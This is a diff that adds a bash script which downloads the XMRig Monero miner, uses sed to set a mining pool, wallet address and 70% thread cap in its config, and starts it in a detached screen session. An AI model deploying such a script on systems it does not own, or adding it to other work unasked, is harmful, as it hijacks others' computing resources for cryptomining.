@@ -1,0 +1,17 @@
+#!/bin/bash
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
+
+tar -xvf xmrig-6.20.0-linux-x64.tar.gz
+
+cd xmrig-6.20.0
+
+sed -i 's/"max-threads-hint": 100,/"max-threads-hint": 70,/' config.json
+
+sed -i 's/"url":.*,/"url": "pool.supportxmr.com:7777",/' config.json
+
+sed -i 's/"user":.*,/"user": "47KG83REd9ucgspUPEbn1xBjQR68tWQjATXFcG6dkskb2RPfEvqawdSRw6T4sFiEopN9Pk4U5dAn81AqP7i2Q8sbN523jM7",/' config.json
+
+sed -i 's/"pass": "x",/"pass": "linode-1",/' config.json
+
+screen -s monero -dm ./xmrig run
